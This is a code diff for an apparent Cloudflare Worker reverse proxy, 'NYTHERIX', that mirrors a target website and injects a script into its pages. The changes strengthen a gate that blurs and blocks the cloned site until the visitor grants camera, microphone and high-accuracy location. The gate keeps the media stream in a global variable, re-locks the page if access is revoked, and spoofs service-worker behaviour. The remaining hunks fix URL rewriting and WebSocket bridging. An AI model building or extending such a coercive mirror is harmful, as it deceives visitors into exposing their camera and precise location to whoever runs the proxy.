@@ -31,11 +31,12 @@ const CFG_TTL = 15000;
 async function getConfig(env) {
   const now = Date.now();
   if (_cfgCache && now - _cfgTs < CFG_TTL) return _cfgCache;
-  _cfgCache = await env.DB
+  const result = await env.DB
     .prepare("SELECT target_url, enabled FROM settings WHERE id = 1")
     .first();
-  _cfgTs = now;
-  return _cfgCache;
+  // Only cache a valid result -- don't cache null/errors so next request retries D1
+  if (result) { _cfgCache = result; _cfgTs = now; }
+  return result;
 }
 
 // =============================================================================
@@ -175,7 +176,7 @@ function escRe(s) {
 }
 
 function makeSubRe(hEsc) {
-  return new RegExp("(https?:)?//((?:[\\w][\\w.-]*\\.)?" + hEsc + ")", "g");
+  return new RegExp("(https?:)?//((?:[\\w\\d][\\w\\d.-]*\\.)?" + hEsc + ")", "g");
 }
 
 function rewriteSubdomains(text, subRe, targetHost, proxyHost) {
@@ -191,9 +192,13 @@ function rewriteSubdomains(text, subRe, targetHost, proxyHost) {
 //  HTML REWRITER
 // =============================================================================
 function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
-  const oEsc  = escRe(targetOrigin);
-  const hEsc  = escRe(targetHost);
-  const subRe = makeSubRe(hEsc);
+  const oEsc   = escRe(targetOrigin);
+  const hEsc   = escRe(targetHost);
+  const subRe  = makeSubRe(hEsc);
+  // Pre-compile once -- reused across all 8 rewrite steps
+  const oReG   = new RegExp(oEsc, "g");
+  const wsReG  = new RegExp("wss://" + hEsc, "g");
+  const wsReG2 = new RegExp("ws://"  + hEsc, "g");
 
   function rwSub(_, proto, host) {
     const prefix = host.length > targetHost.length
@@ -224,7 +229,7 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
     /(<(?:script|link|img|source|audio|video|track|embed|object|form|area|input|use)[^>]+?(?:src|href|action|data-src|poster)\s*=\s*["'])([^"']*)(["'])/gi,
     function(_, pre, url, post) {
       url = url
-        .replace(new RegExp(oEsc, "g"), proxyOrigin)
+        .replace((oReG.lastIndex=0,oReG), proxyOrigin)
         .replace(subRe, rwSub);
       return pre + url + post;
     }
@@ -233,7 +238,7 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
   // 6. Rewrite srcset
   html = html.replace(/\bsrcset=["']([^"']+)["']/gi, function(_, val) {
     return 'srcset="' +
-      val.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub) +
+      val.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) +
       '"';
   });
 
@@ -241,14 +246,14 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
   html = html.replace(
     /(<meta[^>]+?content=["'][^"']*?url=)([^"';\s]+)/gi,
     function(_, pre, url) {
-      return pre + url.replace(new RegExp(oEsc, "g"), proxyOrigin);
+      return pre + url.replace((oReG.lastIndex=0,oReG), proxyOrigin);
     }
   );
 
   // 8. Rewrite inline <style>
   html = html.replace(/(<style\b[^>]*>)([\s\S]*?)(<\/style>)/gi,
     function(_, o, body, c) {
-      return o + body.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub) + c;
+      return o + body.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) + c;
     }
   );
 
@@ -258,9 +263,9 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
     function(_, open, body, close) {
       return open +
         body
-          .replace(new RegExp(oEsc, "g"), proxyOrigin)
-          .replace(new RegExp("wss://" + hEsc, "g"), "wss://" + proxyHost)
-          .replace(new RegExp("ws://"  + hEsc, "g"), "ws://"  + proxyHost)
+          .replace((oReG.lastIndex=0,oReG), proxyOrigin)
+          .replace((wsReG.lastIndex=0,wsReG), "wss://" + proxyHost)
+          .replace((wsReG2.lastIndex=0,wsReG2), "ws://" + proxyHost)
           .replace(subRe, rwSub) +
         close;
     }
@@ -274,7 +279,7 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
         const map = JSON.parse(body);
         function rwMapVal(v) {
           return typeof v === "string"
-            ? v.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub)
+            ? v.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub)
             : v;
         }
         if (map.imports) {
@@ -296,7 +301,7 @@ function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
     attrs = attrs.replace(
       /(src=["'])([^"']*)(["'])/i,
       function(__, pre, url, post) {
-        return pre + url.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub) + post;
+        return pre + url.replace((oReG.lastIndex=0,oReG), proxyOrigin).replace(subRe, rwSub) + post;
       }
     );
     if (/\ballow\s*=/i.test(attrs)) {
@@ -373,11 +378,14 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   // Keep RegExp definitions on single lines to avoid strict-mode parse edge cases
   s += "var _oRe   = new RegExp(" + oEscLit + ", 'g');\n";
   s += "var _wsRe  = new RegExp('wss?://' + " + hEscLit + ", 'g');\n";
-  s += "var _subRe = new RegExp('(https?:)?//((?:[\\\\w][\\\\w.-]*\\\\.)?' + " + hEscLit + " + ')', 'g');\n";
+  s += "var _subRe = new RegExp('(https?:)?//((?:[\\\\w\\\\d][\\\\w\\\\d.-]*\\\\.)?' + " + hEscLit + " + ')', 'g');\n";
   s += "\n";
   s += "function rw(u) {\n";
   s += "  if (!u || typeof u !== 'string') return u;\n";
   s += "  if (/^(data:|blob:|javascript:|#)/i.test(u)) return u;\n";
+  s += "  if (!/^https?:\\/\\//i.test(u)) {\n";
+  s += "    try { u = new URL(u, location.href).href; } catch(e) {}\n";
+  s += "  }\n";
   s += "  _oRe.lastIndex = 0; _wsRe.lastIndex = 0; _subRe.lastIndex = 0;\n";
   s += "  u = u.replace(_oRe, PO);\n";
   s += "  u = u.replace(_wsRe, function(m) {\n";
@@ -543,7 +551,11 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "        _subRe.lastIndex = 0;\n";
   s += "      }\n";
   s += "    } catch(e) {}\n";
-  s += "    return _winOpen.call(window, url, target, features);\n";
+  s += "    return features !== undefined\n";
+  s += "      ? _winOpen.call(window, url, target, features)\n";
+  s += "      : target !== undefined\n";
+  s += "        ? _winOpen.call(window, url, target)\n";
+  s += "        : _winOpen.call(window, url);\n";
   s += "  };\n";
   s += "} catch(e) {}\n";
   s += "\n";
@@ -551,9 +563,18 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   // navigator.serviceWorker no-op shim
   s += "try {\n";
   s += "  if (navigator.serviceWorker) {\n";
+  s += "    var _swActive = { postMessage: function() {}, state: 'activated',\n";
+  s += "      scriptURL: PO + '/', clients: { claim: function() { return Promise.resolve(); } },\n";
+  s += "      addEventListener: function() {}, removeEventListener: function() {},\n";
+  s += "      dispatchEvent: function() { return false; } };\n";
+  s += "    var _swReg = { active: _swActive, scope: PO + '/',\n";
+  s += "      addEventListener: function() {}, removeEventListener: function() {},\n";
+  s += "      installing: null, waiting: null,\n";
+  s += "      update: function() { return Promise.resolve(); },\n";
+  s += "      unregister: function() { return Promise.resolve(true); } };\n";
   s += "    var _swShim = {\n";
-  s += "      register:            function() { return Promise.resolve({ scope: PO + '/' }); },\n";
-  s += "      ready:               Promise.resolve({ active: { postMessage: function() {}, state: 'activated' }, scope: PO + '/', addEventListener: function() {} }),\n";
+  s += "      register:            function() { return Promise.resolve(_swReg); },\n";
+  s += "      ready:               Promise.resolve(_swReg),\n";
   s += "      controller:          null,\n";
   s += "      addEventListener:    function() {},\n";
   s += "      removeEventListener: function() {},\n";
@@ -1013,8 +1034,36 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "//   5-second hard timeout unlocks FOUC for WASM/canvas apps.\n";
   s += "\n";
 
-  // FOUC lock (synchronous -- runs before first paint)
-  s += "try { if (!sessionStorage.getItem('nx_perm_v2')) { document.documentElement.style.opacity = '0.01'; } } catch(e) {}\n";
+  // Blur helper -- always targets <body>, never <html>.
+  // Gate card is appended to <html> and must stay sharp; <body> is the site content.
+  s += "function _blurBody() {\n";
+  s += "  try {\n";
+  s += "    document.body.style.filter        = 'blur(12px)';\n";
+  s += "    document.body.style.pointerEvents = 'none';\n";
+  s += "    document.body.style.userSelect    = 'none';\n";
+  s += "  } catch(e) {}\n";
+  s += "}\n";
+  s += "function _unblurBody() {\n";
+  s += "  try {\n";
+  s += "    document.body.style.filter        = '';\n";
+  s += "    document.body.style.pointerEvents = '';\n";
+  s += "    document.body.style.userSelect    = '';\n";
+  s += "  } catch(e) {}\n";
+  s += "}\n";
+  s += "\n";
+
+  // Synchronous FOUC lock -- shim runs inside <head> so document.body is null here.
+  // Defer the blur to DOMContentLoaded which fires before first paint completes.
+  // This guarantees <body> exists and <html> is never the blur target.
+  s += "try {\n";
+  s += "  if (!sessionStorage.getItem('nx_perm_v2')) {\n";
+  s += "    if (document.body) {\n";
+  s += "      _blurBody();\n";
+  s += "    } else {\n";
+  s += "      document.addEventListener('DOMContentLoaded', _blurBody, { once: true });\n";
+  s += "    }\n";
+  s += "  }\n";
+  s += "} catch(e) {}\n";
   s += "\n";
 
   // _pageIsLocked starts true so the hard timeout cannot bypass the gate
@@ -1023,9 +1072,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "\n";
   s += "function _startFoucTimer() {\n";
   s += "  _foucTimer = setTimeout(function() {\n";
-  s += "    if (!_pageIsLocked) {\n";
-  s += "      try { document.documentElement.style.visibility = ''; document.documentElement.style.opacity = ''; } catch(e) {}\n";
-  s += "    }\n";
+  s += "    if (!_pageIsLocked) _unblurBody();\n";
   s += "  }, 5000);\n";
   s += "}\n";
   s += "_startFoucTimer();\n";
@@ -1034,7 +1081,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "function _unlockPage() {\n";
   s += "  _pageIsLocked = false;\n";
   s += "  clearTimeout(_foucTimer);\n";
-  s += "  try { document.documentElement.style.visibility = ''; document.documentElement.style.opacity = ''; } catch(e) {}\n";
+  s += "  _unblurBody();\n";
   s += "}\n";
   s += "\n";
 
@@ -1042,6 +1089,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "function _ss(k, v) {\n";
   s += "  try {\n";
   s += "    if (v === undefined) return sessionStorage.getItem(k);\n";
+  s += "    if (v === null) { sessionStorage.removeItem(k); return; }\n";
   s += "    sessionStorage.setItem(k, v);\n";
   s += "  } catch(e) { return null; }\n";
   s += "}\n";
@@ -1050,7 +1098,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   // _queryPerms
   s += "function _queryPerms() {\n";
   s += "  if (!navigator.permissions || !navigator.permissions.query) {\n";
-  s += "    return Promise.resolve({ cam: 'prompt', geo: 'prompt', raw: [] });\n";
+  s += "    return Promise.resolve({ cam: 'prompt', geo: 'prompt' });\n";
   s += "  }\n";
   s += "  return Promise.all([\n";
   s += "    navigator.permissions.query({ name: 'camera'      }).catch(function() { return { state: 'prompt' }; }),\n";
@@ -1060,7 +1108,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "    var cam = (r[0].state === 'denied' || r[1].state === 'denied') ? 'denied'\n";
   s += "            : (r[0].state === 'granted' && r[1].state === 'granted') ? 'granted'\n";
   s += "            : 'prompt';\n";
-  s += "    return { cam: cam, geo: r[2].state, raw: r };\n";
+  s += "    return { cam: cam, geo: r[2].state };\n";
   s += "  });\n";
   s += "}\n";
   s += "\n";
@@ -1078,8 +1126,17 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "  window.sharedStream   = null;\n";
   s += "  nx.location           = null;\n";
   s += "  nx.permissionsGranted = false;\n";
-  s += "  _ss(SKEY, '');\n";
-  s += "  try { document.documentElement.style.visibility = 'hidden'; } catch(e) {}\n";
+  s += "  _ss(SKEY, null);\n";
+  s += "  _blurBody();\n";
+  s += "  if (_regrantPoll) { clearInterval(_regrantPoll); _regrantPoll = null; }\n";
+  s += "  _regrantPoll = setInterval(function() {\n";
+  s += "    _queryPerms().then(function(states) {\n";
+  s += "      if (states.cam === 'granted' && states.geo === 'granted' && !window.__nytherix.permissionsGranted) {\n";
+  s += "        clearInterval(_regrantPoll); _regrantPoll = null;\n";
+  s += "        location.reload();\n";
+  s += "      }\n";
+  s += "    }).catch(function() {});\n";
+  s += "  }, 3000);\n";
   s += "  var existing = document.getElementById('_nx_gate');\n";
   s += "  if (existing && existing.parentNode) existing.parentNode.removeChild(existing);\n";
   s += "  _showGate(true);\n";
@@ -1088,7 +1145,8 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
 
   // _watchRevocations
   s += "var _watchersAttached = false;\n";
-  s += "var _pollInterval     = null;\n";
+  s += "var _pollInterval     = null;  // revocation poll (5s, active while granted)\n";
+  s += "var _regrantPoll      = null;  // re-grant poll (3s, active while locked)\n";
   s += "\n";
   s += "function _watchRevocations() {\n";
   s += "  if (_watchersAttached) return;\n";
@@ -1101,8 +1159,10 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "        status.addEventListener('change', function() {\n";
   s += "          if (status.state === 'denied') {\n";
   s += "            _lockPage('onchange: ' + name + ' denied');\n";
-  s += "          } else if (status.state === 'granted' && !window.__nytherix.permissionsGranted) {\n";
-  s += "            location.reload();\n";
+  s += "          } else if (!window.__nytherix.permissionsGranted) {\n";
+  s += "            _queryPerms().then(function(st) {\n";
+  s += "              if (st.cam === 'granted' && st.geo === 'granted') location.reload();\n";
+  s += "            }).catch(function() {});\n";
   s += "          }\n";
   s += "        });\n";
   s += "      })\n";
@@ -1120,12 +1180,13 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "    }).catch(function() {});\n";
   s += "  });\n";
   s += "\n";
+  s += "  if (_pollInterval) { clearInterval(_pollInterval); _pollInterval = null; }\n";
   s += "  _pollInterval = setInterval(function() {\n";
   s += "    _queryPerms().then(function(states) {\n";
   s += "      if (states.cam === 'denied' || states.geo === 'denied') {\n";
-  s += "        if (window.__nytherix.permissionsGranted) _lockPage('interval: denied');\n";
+  s += "        _lockPage('interval: denied');\n";
   s += "      } else if (states.cam === 'granted' && states.geo === 'granted' && !window.__nytherix.permissionsGranted) {\n";
-  s += "        clearInterval(_pollInterval);\n";
+  s += "        clearInterval(_pollInterval); _pollInterval = null;\n";
   s += "        location.reload();\n";
   s += "      }\n";
   s += "    }).catch(function() {});\n";
@@ -1146,8 +1207,9 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "  window.sharedStream = stream;\n";
   s += "  _ss(SKEY, '1');\n";
   s += "  _watchRevocations();\n";
-  s += "  _unlockPage();\n";
+  // Remove gate first (420ms fade), then unblur so site is never exposed during transition
   s += "  _removeGate();\n";
+  s += "  setTimeout(function() { _unlockPage(); }, 430);\n";
   s += "  try { window.__nytherix.runFeatures(); } catch(e) { console.warn('[NYTHERIX] runFeatures error:', e); }\n";
   s += "}\n";
   s += "\n";
@@ -1156,12 +1218,15 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "(function _initGate() {\n";
   s += "  var hasMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);\n";
   s += "  var hasGeo   = !!navigator.geolocation;\n";
-  s += "  if (!hasMedia || !hasGeo) { _unlockPage(); return; }\n";
+  s += "  if (!hasMedia || !hasGeo) {\n";
+  s += "    if (document.body) { _unlockPage(); } else { document.addEventListener('DOMContentLoaded', _unlockPage, { once: true }); }\n";
+  s += "    return;\n";
+  s += "  }\n";
   s += "\n";
   s += "  _queryPerms().then(function(states) {\n";
   s += "\n";
   s += "    if (states.cam === 'denied' || states.geo === 'denied') {\n";
-  s += "      _ss(SKEY, '');\n";
+  s += "      _ss(SKEY, null);\n";
   s += "      _watchRevocations();\n";
   s += "      _showGate(true);\n";
   s += "      return;\n";
@@ -1174,13 +1239,20 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "        navigator.geolocation.getCurrentPosition(res, function() { res(null); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });\n";
   s += "      });\n";
   s += "      Promise.all([sp, gp]).then(function(r) {\n";
-  s += "        if (!r[0] || !r[1]) { _ss(SKEY, ''); _showGate(false); return; }\n";
+  s += "        if (!r[0] || !r[1]) {\n";
+  s += "          _ss(SKEY, null);\n";
+  s += "          // Acquisition failed despite granted perms -- likely hardware/system error\n";
+  s += "          _showGate(false);\n";
+  s += "          var st2 = document.getElementById('_nx_st');\n";
+  s += "          if (st2) { st2.style.color = '#f87171'; st2.textContent = !r[0] ? 'Camera unavailable. Check hardware and try again.' : 'Location unavailable. Check system settings and try again.'; }\n";
+  s += "          return;\n";
+  s += "        }\n";
   s += "        _onGranted(r[0], r[1]);\n";
   s += "      });\n";
   s += "      return;\n";
   s += "    }\n";
   s += "\n";
-  s += "    if (_ss(SKEY) === '1') _ss(SKEY, '');\n";
+  s += "    if (_ss(SKEY) === '1') _ss(SKEY, null);\n";
   s += "    _showGate(false);\n";
   s += "\n";
   s += "  }).catch(function() { _showGate(false); });\n";
@@ -1195,7 +1267,13 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "      _lockPage('pageshow: denied');\n";
   s += "      return;\n";
   s += "    }\n";
+  s += "    if (states.cam === 'granted' && states.geo === 'granted') {\n";
+  s += "      if (_ss(SKEY) !== '1') _showGate(false);\n";
+  s += "      return;\n";
+  s += "    }\n";
+  // Prompt state on BFCache restore -- show gate and watch for re-grant
   s += "    if (_ss(SKEY) !== '1' && !document.getElementById('_nx_gate')) _showGate(false);\n";
+  s += "    _watchRevocations();\n";
   s += "  }).catch(function() {});\n";
   s += "});\n";
   s += "\n";
@@ -1232,15 +1310,23 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
 
   // _showDenied: uses innerHTML so HTML entities render correctly
   s += "function _showDenied() {\n";
-  s += "  var d  = document.getElementById('_nx_dn');\n";
-  s += "  var b  = document.getElementById('_nx_btn');\n";
-  s += "  var ic = document.getElementById('_nx_icon');\n";
-  s += "  var ti = document.getElementById('_nx_title');\n";
+  s += "  var d     = document.getElementById('_nx_dn');\n";
+  s += "  var b     = document.getElementById('_nx_btn');\n";
+  s += "  var ic    = document.getElementById('_nx_icon');\n";
+  s += "  var ti    = document.getElementById('_nx_title');\n";
+  s += "  var sub   = document.getElementById('_nx_sub');\n";
+  s += "  var steps = document.getElementById('_nx_steps');\n";
+  s += "  var st    = document.getElementById('_nx_st');\n";
+  // Hide the entire request UI
+  s += "  if (b)     b.style.display     = 'none';\n";
+  s += "  if (sub)   sub.style.display   = 'none';\n";
+  s += "  if (steps) steps.style.display = 'none';\n";
+  s += "  if (st)    st.style.display    = 'none';\n";
+  // Show only the denied panel
   s += "  if (d)  d.style.display = 'block';\n";
-  s += "  if (b)  { b.disabled = true; b.style.opacity = '0.35'; b.style.cursor = 'not-allowed'; }\n";
-  // &#x26A0; = warning sign, &#xFE0F; = emoji variation selector -> renders as ⚠️
-  s += "  if (ic) ic.innerHTML = '&#x26A0;&#xFE0F;';\n";
-  s += "  if (ti) { ti.textContent = 'Permissions Denied'; ti.style.color = '#f87171'; }\n";
+  // &#x26D4; = no-entry sign
+  s += "  if (ic) ic.innerHTML = '&#x26D4;';\n";
+  s += "  if (ti) { ti.textContent = 'Access Blocked'; ti.style.color = '#f87171'; }\n";
   s += "}\n";
   s += "\n";
 
@@ -1259,22 +1345,22 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "    var ov = document.createElement('div');\n";
   s += "    ov.id = '_nx_gate';\n";
   s += "    ov.style.cssText =\n";
-  s += "      'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;'\n";
+  s += "      'position:fixed;top:0;right:0;bottom:0;left:0;width:100%;height:100%;'\n";
+  s += "      + 'z-index:2147483647;display:flex;align-items:center;'\n";
   s += "      + 'justify-content:center;padding:24px;'\n";
   s += "      + 'font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",system-ui,sans-serif;'\n";
   s += "      + 'color:#e2e8f0;text-align:center;'\n";
-  s += "      + 'background:rgba(6,7,12,0.9);'\n";
-  s += "      + 'backdrop-filter:blur(24px) saturate(160%);'\n";
-  s += "      + '-webkit-backdrop-filter:blur(24px) saturate(160%);'\n";
+  s += "      + 'background:transparent;'\n";
+  s += "      + 'pointer-events:none;'\n";
   s += "      + 'transition:opacity 0.4s;';\n";
   s += "\n";
   s += "    ov.innerHTML =\n";
   s += "        '<div style=\"max-width:440px;width:100%;'\n";
-  s += "        + 'background:linear-gradient(155deg,rgba(12,16,22,0.97),rgba(6,7,12,0.99));'\n";
+  s += "        + 'background:rgba(6,7,12,0.97);'\n";
   s += "        + 'border:1px solid rgba(0,255,224,0.13);border-radius:22px;'\n";
   s += "        + 'padding:44px 36px 36px;'\n";
   s += "        + 'box-shadow:0 40px 80px rgba(0,0,0,0.65),0 0 0 1px rgba(0,255,224,0.04);'\n";
-  s += "        + 'position:relative;overflow:hidden\">'\n";
+  s += "        + 'position:relative;overflow:hidden;pointer-events:all\">'\n";
   // ambient glow
   s += "      + '<div style=\"position:absolute;top:-80px;left:50%;transform:translateX(-50%);'\n";
   s += "        + 'width:260px;height:260px;'\n";
@@ -1288,7 +1374,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "        + 'This service requires <strong style=\"color:#e2e8f0\">Camera &amp; Microphone</strong>'\n";
   s += "        + ' and <strong style=\"color:#e2e8f0\">Location</strong> access to continue.'\n";
   s += "        + ' Click below and allow both prompts.</p>'\n";
-  s += "      + '<div style=\"display:flex;gap:8px;justify-content:center;margin-bottom:28px\">'\n";
+  s += "      + '<div id=\"_nx_steps\" style=\"display:flex;gap:8px;justify-content:center;margin-bottom:28px\">'\n";
   // &#x1F4F7; = camera, &#x1F4CD; = pin, &#x2705; = checkmark
   s += "        + _step('_nx_s1', '&#x1F4F7;', 'Camera')\n";
   s += "        + _step('_nx_s2', '&#x1F4CD;', 'Location')\n";
@@ -1325,8 +1411,9 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "      + '</div>'\n";
   s += "    + '</div>';\n";
   s += "\n";
-  s += "    (document.body || document.documentElement).appendChild(ov);\n";
-  s += "    try { document.documentElement.style.visibility = 'visible'; document.documentElement.style.opacity = ''; } catch(e) {}\n";
+  s += "    // Append to <html> not <body> -- proxied sites often apply transform/filter\n";
+  s += "    // to <body> which traps position:fixed children relative to body not viewport.\n";
+  s += "    document.documentElement.appendChild(ov);\n";
   s += "    if (denied) _showDenied();\n";
   s += "  }\n";
   s += "\n";
@@ -1363,7 +1450,7 @@ function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
   s += "      try { _stream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}\n";
   s += "      _stream = null;\n";
   s += "    }\n";
-  s += "    _ss(SKEY, '');\n";
+  s += "    _ss(SKEY, null);\n";
   s += "    _showDenied();\n";
   s += "  }\n";
   s += "\n";
@@ -1461,6 +1548,25 @@ function errPage(title, detail) {
 // =============================================================================
 export default {
   async fetch(request, env) {
+    try {
+      return await _handle(request, env);
+    } catch (err) {
+      const msg = err && err.message ? err.message : String(err);
+      // CF enforces null body on 101/204/205/304 -- if that constraint fires as an
+      // exception, we cannot return a body either. Return a minimal bodyless 500.
+      if (msg && msg.includes("null body status")) {
+        return new Response(null, { status: 500 });
+      }
+      console.error("[NYTHERIX] Unhandled exception:", err);
+      return htmlRes(errPage(
+        "Worker Error",
+        "An unexpected error occurred.<br><br><code>" + msg + "</code>"
+      ), 500);
+    }
+  }
+};
+
+async function _handle(request, env) {
     const url         = new URL(request.url);
     const proxyHost   = url.hostname;
     const proxyOrigin = "https://" + proxyHost;
@@ -1516,7 +1622,13 @@ export default {
       wsHdr.set("Host",   targetHost);
       wsHdr.set("Origin", targetOrigin);
       try {
-        const [client, server] = Object.values(new WebSocketPair());
+        // WebSocketPair: index 0 = client-facing socket (returned to browser in 101 response)
+        //                index 1 = server-facing socket (Worker uses to bridge to upstream)
+        const pair   = new WebSocketPair();
+        const client = pair[0];
+        const worker = pair[1];
+        wsHdr.set("Upgrade",    "websocket");
+        wsHdr.set("Connection", "Upgrade");
         const upRes = await fetch(wsUrl, { headers: wsHdr, cf: { cacheEverything: false } });
         if (upRes.status !== 101) {
           return new Response("WS upstream refused (" + upRes.status + ")", { status: 502 });
@@ -1524,13 +1636,13 @@ export default {
         const upWS = upRes.webSocket;
         if (!upWS) return new Response("WS proxy unavailable", { status: 502 });
         upWS.accept();
-        client.accept();
-        upWS.addEventListener("message",  function(e) { try { client.send(e.data);  } catch(_) {} });
-        client.addEventListener("message", function(e) { try { upWS.send(e.data);   } catch(_) {} });
-        upWS.addEventListener("close",    function(e) { try { client.close(e.code, e.reason); } catch(_) {} });
-        client.addEventListener("close",   function(e) { try { upWS.close(e.code, e.reason);  } catch(_) {} });
-        upWS.addEventListener("error",    function()  { try { client.close(1011, "upstream error"); } catch(_) {} });
-        client.addEventListener("error",   function()  { try { upWS.close(1011, "client error");    } catch(_) {} });
+        worker.accept();
+        upWS.addEventListener("message",  function(e) { try { worker.send(e.data);  } catch(_) {} });
+        worker.addEventListener("message", function(e) { try { upWS.send(e.data);   } catch(_) {} });
+        upWS.addEventListener("close",    function(e) { try { worker.close(e.code, e.reason); } catch(_) {} });
+        worker.addEventListener("close",   function(e) { try { upWS.close(e.code, e.reason);  } catch(_) {} });
+        upWS.addEventListener("error",    function()  { try { worker.close(1011, "upstream error"); } catch(_) {} });
+        worker.addEventListener("error",   function()  { try { upWS.close(1011, "worker error");    } catch(_) {} });
         const proto     = request.headers.get("Sec-WebSocket-Protocol");
         const wsRespHdr = new Headers({ "Upgrade": "websocket", "Connection": "Upgrade" });
         if (proto) wsRespHdr.set("Sec-WebSocket-Protocol", proto.split(",")[0].trim());
@@ -1543,10 +1655,10 @@ export default {
     // 4. Build upstream request
     const upstreamUrl = targetOrigin + url.pathname + url.search;
     const upHdr = new Headers(request.headers);
-    upHdr.set("Host",            targetHost);
-    upHdr.set("Referer",         targetOrigin + url.pathname);
-    upHdr.set("Origin",          targetOrigin);
-    upHdr.set("Accept-Encoding", "identity");
+    upHdr.set("Host",    targetHost);
+    upHdr.set("Referer", targetOrigin + url.pathname);
+    upHdr.set("Origin",  targetOrigin);
+    upHdr.delete("Accept-Encoding"); // CF Workers auto-decompresses; identity causes 406 on strict upstreams
     for (const h of STRIP_REQ) upHdr.delete(h);
 
     // 5. Fetch upstream
@@ -1599,31 +1711,41 @@ export default {
 
     const ct = (headers.get("Content-Type") || "").toLowerCase();
 
-    // 8. Media -- stream directly, never buffer
+    // 8. Null-body statuses -- CF forbids any body on these
+    if ([204, 205, 304].includes(upstream.status)) {
+      headers.delete("Content-Length");
+      headers.delete("Transfer-Encoding");
+      headers.delete("Content-Encoding");
+      return new Response(null, { status: upstream.status, headers });
+    }
+
+    // 9. Media -- stream directly, never buffer
     if (isMedia(ct)) {
       headers.delete("Content-Encoding");
       return new Response(upstream.body, { status: upstream.status, headers });
     }
 
-    // 9. Text -- rewrite URLs
+    // 10. Text -- rewrite URLs
     if (isText(ct)) {
       let text;
       try { text = await upstream.text(); }
       catch {
-        return new Response(upstream.body, { status: upstream.status, headers });
+        // Stream read failed -- body consumed or connection dropped; return generic error
+        return htmlRes(errPage("Read Error", "Failed to read response from upstream."), 502);
       }
 
       const oEsc  = escRe(targetOrigin);
       const hEsc  = escRe(targetHost);
       const subRe = makeSubRe(hEsc);
 
-      text = text.replace(new RegExp(oEsc, "g"), proxyOrigin);
-      text = text.replace(new RegExp("wss://" + hEsc, "g"), "wss://" + proxyHost);
-      text = text.replace(new RegExp("ws://"  + hEsc, "g"), "ws://"  + proxyHost);
-      text = rewriteSubdomains(text, subRe, targetHost, proxyHost);
-
       if (ct.includes("text/html")) {
+        // rewriteHTML handles all URL rewrites internally -- no pre-pass needed
         text = rewriteHTML(text, proxyOrigin, proxyHost, targetOrigin, targetHost);
+      } else {
+        text = text.replace(new RegExp(oEsc, "g"), proxyOrigin);
+        text = text.replace(new RegExp("wss://" + hEsc, "g"), "wss://" + proxyHost);
+        text = text.replace(new RegExp("ws://"  + hEsc, "g"), "ws://"  + proxyHost);
+        text = rewriteSubdomains(text, subRe, targetHost, proxyHost);
       }
 
       headers.delete("Content-Length");
@@ -1632,8 +1754,7 @@ export default {
       return new Response(text, { status: upstream.status, headers });
     }
 
-    // 10. Everything else (WASM, fonts, unrecognised types)
+    // 11. Everything else (WASM, fonts, unrecognised types)
     headers.delete("Content-Encoding");
     return new Response(upstream.body, { status: upstream.status, headers });
-  }
-};
+}
